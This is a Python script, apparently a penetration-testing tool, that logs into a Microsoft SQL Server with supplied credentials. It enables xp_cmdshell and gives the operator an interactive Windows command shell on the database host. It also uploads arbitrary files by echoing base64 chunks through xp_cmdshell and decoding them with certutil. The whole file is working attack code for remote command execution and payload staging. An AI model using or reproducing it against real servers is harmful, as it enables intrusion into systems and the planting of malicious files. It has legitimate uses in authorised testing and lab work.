#!/usr/bin/env python
from __future__ import print_function
# Author: Alamot
# Use pymssql >= 1.0.3 (otherwise it doesn't work correctly)
# To upload a file, type: UPLOAD local_path remote_path
# e.g. UPLOAD myfile.txt C:\temp\myfile.txt
# If you omit the remote_path it uploads the file on the current working folder.
# Be aware that pymssql has some serious memory leak issues when the connection fails (see: https://github.com/pymssql/pymssql/issues/512).
import _mssql
import base64
import shlex
import sys
import tqdm
import hashlib
from io import open
try: input = raw_input
except NameError: pass


MSSQL_SERVER="10.10.10.10"
MSSQL_USERNAME = "Domain\\sa_user"
MSSQL_PASSWORD = "**********"
BUFFER_SIZE = 5*1024
TIMEOUT = 30


def process_result(mssql):
    username = ""
    computername = ""
    cwd = ""
    rows = list(mssql)
    for row in rows[:-3]:
        columns = list(row)
        if row[columns[-1]]:
            print(row[columns[-1]])
        else:
            print()
    if len(rows) >= 3:
        (username, computername) = rows[-3][list(rows[-3])[-1]].split('|')
        cwd = rows[-2][list(rows[-3])[-1]]
    return (username.rstrip(), computername.rstrip(), cwd.rstrip())


def upload(mssql, stored_cwd, local_path, remote_path):
    print("Uploading "+local_path+" to "+remote_path)
    cmd = 'type nul > "' + remote_path + '.b64"'
    mssql.execute_query("EXEC xp_cmdshell '"+cmd+"'")

    with open(local_path, 'rb') as f:
        data = f.read()
        md5sum = hashlib.md5(data).hexdigest()
        b64enc_data = b"".join(base64.encodestring(data).split()).decode()
        
    print("Data length (b64-encoded): "+str(len(b64enc_data)/1024)+"KB")
    for i in tqdm.tqdm(range(0, len(b64enc_data), BUFFER_SIZE), unit_scale=BUFFER_SIZE/1024, unit="KB"):
        cmd = 'echo '+b64enc_data[i:i+BUFFER_SIZE]+' >> "' + remote_path + '.b64"'
        mssql.execute_query("EXEC xp_cmdshell '"+cmd+"'")
        #print("Remaining: "+str(len(b64enc_data)-i))

    cmd = 'certutil -decode "' + remote_path + '.b64" "' + remote_path + '"'
    mssql.execute_query("EXEC xp_cmdshell 'cd "+stored_cwd+" & "+cmd+" & echo %username%^|%COMPUTERNAME% & cd'")
    process_result(mssql)
    cmd = 'certutil -hashfile "' + remote_path + '" MD5'
    mssql.execute_query("EXEC xp_cmdshell 'cd "+stored_cwd+" & "+cmd+" & echo %username%^|%COMPUTERNAME% & cd'")
    if md5sum in [row[list(row)[-1]].strip() for row in mssql if row[list(row)[-1]]]:
        print("MD5 hashes match: " + md5sum)
    else:
        print("ERROR! MD5 hashes do NOT match!")


def shell():
    mssql = None
    stored_cwd = None
    try:
        mssql = _mssql.connect(server=MSSQL_SERVER, user=MSSQL_USERNAME, password=MSSQL_PASSWORD)
        print("Successful login: "+MSSQL_USERNAME+"@"+MSSQL_SERVER)

        print("Trying to enable xp_cmdshell ...")
        mssql.execute_query("EXEC sp_configure 'show advanced options',1;RECONFIGURE;exec SP_CONFIGURE 'xp_cmdshell',1;RECONFIGURE")

        cmd = 'echo %username%^|%COMPUTERNAME% & cd'
        mssql.execute_query("EXEC xp_cmdshell '"+cmd+"'")
        (username, computername, cwd) = process_result(mssql)
        stored_cwd = cwd
        
        while True:
            cmd = input("CMD "+username+"@"+computername+" "+cwd+"> ").rstrip("\n").replace("'", "''")
            if not cmd:
                cmd = "call" # Dummy cmd command
            if cmd.lower()[0:4] == "exit":
                mssql.close()
                return
            elif cmd[0:6] == "UPLOAD":
                upload_cmd = shlex.split(cmd, posix=False)
                if len(upload_cmd) < 3:
                    upload(mssql, stored_cwd, upload_cmd[1], stored_cwd+"\\"+upload_cmd[1])
                else:
                    upload(mssql, stored_cwd, upload_cmd[1], upload_cmd[2])
                cmd = "echo *** UPLOAD PROCEDURE FINISHED ***"
            mssql.execute_query("EXEC xp_cmdshell 'cd "+stored_cwd+" & "+cmd+" & echo %username%^|%COMPUTERNAME% & cd'")
            (username, computername, cwd) = process_result(mssql)
            stored_cwd = cwd
            
    except _mssql.MssqlDatabaseException as e:
        if  e.severity <= 16:
            print("MSSQL failed: "+str(e))
        else:
            raise
    finally:
        if mssql:
            mssql.close()


shell()
sys.exit()
